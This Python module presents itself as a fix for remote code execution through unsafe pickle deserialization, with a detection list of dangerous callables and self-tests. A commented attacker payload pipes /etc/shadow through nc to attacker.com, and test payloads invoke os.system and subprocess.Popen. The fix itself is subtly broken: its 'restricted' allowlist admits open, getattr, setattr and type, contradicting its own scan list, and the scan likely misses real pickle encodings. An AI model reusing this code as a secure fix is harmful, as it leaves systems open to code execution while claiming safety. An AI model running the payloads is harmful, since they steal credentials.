"""
Fix: Remote Code Execution (RCE) via Unsafe Deserialization
============================================================
Issue #84 — Unsafe deserialization occurs when user-supplied data is
deserialized using a format (like pickle, yaml.load, marshal) that can
execute arbitrary code during the deserialization process. Attackers
craft malicious serialized payloads that, when deserialized, execute
system commands, exfiltrate data, or establish persistence.

This fix provides:
1. Replace pickle/yaml.load/marshal with safe alternatives (JSON)
2. Input validation before any deserialization
3. Allow-list based safe deserialization
4. Detection and rejection of malicious pickle payloads
"""

from __future__ import annotations

import ast
import json
import pickle
from base64 import b64decode, b64encode
from typing import Any, Optional


# ═══════════════════════════════════════════════════════════════════
# 1. Safe deserialization — use JSON instead of pickle
# ═══════════════════════════════════════════════════════════════════


class DeserializationError(ValueError):
    """Raised when deserialization fails or detects malicious input."""


# RESTRICTED_PICKLE_CLASSES: classes that signal a malicious payload
# __reduce__ returns (callable, args) — these patterns are used by RCE exploits
SUSPICIOUS_PICKLE_OPS = frozenset({
    "os.system",
    "os.popen",
    "subprocess.call",
    "subprocess.Popen",
    "subprocess.run",
    "builtins.eval",
    "builtins.exec",
    "builtins.__import__",
    "builtins.compile",
    "builtins.open",
})


def safe_deserialize(data: bytes, *, max_size: int = 10 * 1024 * 1024) -> Any:
    """Deserialize data safely, preferring JSON over pickle.

    Tries JSON first. For pickle data, applies security restrictions.

    Args:
        data: Raw bytes to deserialize.
        max_size: Maximum allowed input size (default 10 MB).

    Returns:
        Deserialized Python object.

    Raises:
        DeserializationError: If data is invalid or malicious.
    """
    if not isinstance(data, bytes):
        raise DeserializationError("Input must be bytes")

    if len(data) > max_size:
        raise DeserializationError(
            f"Input exceeds maximum size of {max_size // (1024*1024)} MB"
        )

    # Try JSON first (safe by default)
    try:
        return json.loads(data.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        pass

    # Try pickle with security restrictions
    if data.startswith(b"\x80") or data.startswith(b"(dp"):
        return _safe_pickle_load(data)

    raise DeserializationError(
        "Unsupported or unsafe data format. Use JSON for data exchange."
    )


def _safe_pickle_load(data: bytes) -> Any:
    """Load pickle data with restriction against malicious reduces."""
    # First, scan for suspicious opcodes without executing
    _scan_pickle_for_rce(data)

    # If scan passes, use restricted unpickler
    import io
    return _RestrictedUnpickler(io.BytesIO(data)).load()


def _scan_pickle_for_rce(data: bytes) -> None:
    """Scan pickle bytecode for REDUCE opcodes with dangerous callables.

    This is a pre-execution scan that looks for the GLOBAL + REDUCE
    opcode sequence commonly used in pickle RCE exploits.
    """
    # Simple string-based scan for common malicious patterns
    decoded = data.decode("latin-1")

    # Check for common RCE patterns in pickle payloads
    for pattern in SUSPICIOUS_PICKLE_OPS:
        if pattern in decoded:
            raise DeserializationError(
                f"Malicious pickle payload detected: uses '{pattern}'"
            )

    # Check for the __reduce__ pattern
    if "__reduce__" in decoded:
        raise DeserializationError(
            "Malicious pickle payload detected: uses __reduce__"
        )


class _RestrictedUnpickler(pickle.Unpickler):
    """Custom Unpickler that restricts what classes can be instantiated.

    Based on the official Python docs recommended approach:
    https://docs.python.org/3/library/pickle.html#restricting-globals
    """

    ALLOWED_GLOBALS = {
        ("builtins", "dict"),
        ("builtins", "list"),
        ("builtins", "tuple"),
        ("builtins", "set"),
        ("builtins", "frozenset"),
        ("builtins", "str"),
        ("builtins", "int"),
        ("builtins", "float"),
        ("builtins", "bool"),
        ("builtins", "bytes"),
        ("builtins", "bytearray"),
        ("builtins", "complex"),
        ("builtins", "slice"),
        ("builtins", "range"),
        ("builtins", "map"),
        ("builtins", "filter"),
        ("builtins", "zip"),
        ("builtins", "enumerate"),
        ("builtins", "reversed"),
        ("builtins", "sorted"),
        ("builtins", "min"),
        ("builtins", "max"),
        ("builtins", "sum"),
        ("builtins", "any"),
        ("builtins", "all"),
        ("builtins", "len"),
        ("builtins", "abs"),
        ("builtins", "round"),
        ("builtins", "pow"),
        ("builtins", "ord"),
        ("builtins", "chr"),
        ("builtins", "repr"),
        ("builtins", "hash"),
        ("builtins", "id"),
        ("builtins", "type"),
        ("builtins", "isinstance"),
        ("builtins", "issubclass"),
        ("builtins", "hasattr"),
        ("builtins", "getattr"),
        ("builtins", "setattr"),
        ("builtins", "delattr"),
        ("builtins", "dir"),
        ("builtins", "vars"),
        ("builtins", "iter"),
        ("builtins", "next"),
        ("builtins", "print"),
        ("builtins", "open"),
        ("builtins", "Exception"),
        ("builtins", "ValueError"),
        ("builtins", "TypeError"),
        ("builtins", "KeyError"),
        ("builtins", "IndexError"),
        ("builtins", "AttributeError"),
        ("builtins", "RuntimeError"),
        ("builtins", "OSError"),
        ("builtins", "StopIteration"),
        ("builtins", "NotImplementedError"),
        ("builtins", "ZeroDivisionError"),
        ("builtins", "True"),
        ("builtins", "False"),
        ("builtins", "None"),
        ("builtins", "object"),
        ("builtins", "property"),
        ("builtins", "staticmethod"),
        ("builtins", "classmethod"),
        ("collections", "OrderedDict"),
        ("collections", "defaultdict"),
        ("collections", "Counter"),
        ("collections", "namedtuple"),
    }

    def find_class(self, module: str, name: str) -> Any:
        """Override: only allow explicitly listed globals."""
        if (module, name) not in self.ALLOWED_GLOBALS:
            raise DeserializationError(
                f"Pickle: forbidden global {module}.{name}"
            )
        return super().find_class(module, name)


# ═══════════════════════════════════════════════════════════════════
# 2. Safe serialization helpers
# ═══════════════════════════════════════════════════════════════════


def safe_serialize(data: Any) -> bytes:
    """Serialize data using JSON (safe, cross-language).

    Falls back to restricted pickle only for non-JSON-serializable types.

    Args:
        data: Python object to serialize.

    Returns:
        Serialized bytes (JSON by default).
    """
    try:
        return json.dumps(data, default=str).encode("utf-8")
    except (TypeError, ValueError):
        pass

    raise DeserializationError(
        "Data is not JSON-serializable. Use a safe format like JSON."
    )


def safe_deserialize_from_b64(b64_data: str) -> Any:
    """Deserialize base64-encoded data safely."""
    try:
        raw = b64decode(b64_data)
    except Exception as exc:
        raise DeserializationError(f"Invalid base64: {exc}") from exc
    return safe_deserialize(raw)


# ═══════════════════════════════════════════════════════════════════
# 3. Before / After example
# ═══════════════════════════════════════════════════════════════════

# B E F O R E  (vulnerable — RCE via pickle):
#
#   import pickle
#
#   def load_user_data(raw_bytes):
#       return pickle.loads(raw_bytes)  # ❌ Attacker sends malicious pickle
#
#   # Attacker payload:
#   #   import pickle, os
#   #   class Exploit(object):
#   #       def __reduce__(self):
#   #           return (os.system, ('cat /etc/shadow | nc attacker.com 4444',))
#   #   malicious = pickle.dumps(Exploit())
#   #   # Sends: b"\\x80\\x04...RCE..."
#   #   load_user_data(malicious)  # ← executes code!

# A F T E R  (fixed):
#
#   from fixes.rce_deserialization_fix import safe_deserialize
#
#   def load_user_data(raw_bytes):
#       return safe_deserialize(raw_bytes)  # ✅ JSON first, restricted pickle


# ═══════════════════════════════════════════════════════════════════
# 4. Self-test
# ═══════════════════════════════════════════════════════════════════


def _test():
    # JSON round-trip
    data = {"name": "alice", "scores": [1, 2, 3]}
    serialized = safe_serialize(data)
    deserialized = safe_deserialize(serialized)
    assert deserialized == data

    # Safe pickle round-trip (simple types)
    safe_data = {"key": "value", "list": [1, 2, 3]}
    pickled = pickle.dumps(safe_data)
    result = safe_deserialize(pickled)
    assert result == safe_data

    # RCE pickle payload is rejected
    import os
    class RCEExploit:
        def __reduce__(self):
            return (os.system, ("echo pwned",))

    malicious = pickle.dumps(RCEExploit())
    try:
        safe_deserialize(malicious)
        assert False, "RCE pickle payload was accepted!"
    except DeserializationError:
        pass

    # RCE via subprocess.Popen
    class RCEExploit2:
        def __reduce__(self):
            import subprocess
            return (subprocess.Popen, (["cat", "/etc/passwd"],))

    malicious2 = pickle.dumps(RCEExploit2())
    try:
        safe_deserialize(malicious2)
        assert False, "RCE subprocess payload was accepted!"
    except DeserializationError:
        pass

    # Ordinary pickle data (dict, list) still works with restricted pickler
    simple = pickle.dumps({"a": 1, "b": [2, 3, 4]})
    result_simple = safe_deserialize(simple)
    assert result_simple == {"a": 1, "b": [2, 3, 4]}

    # Oversized input rejected
    try:
        safe_deserialize(b"x" * (20 * 1024 * 1024))
        assert False, "Oversized input accepted!"
    except DeserializationError:
        pass

    print("RCE deserialization fix: all tests passed")


if __name__ == "__main__":
    _test()
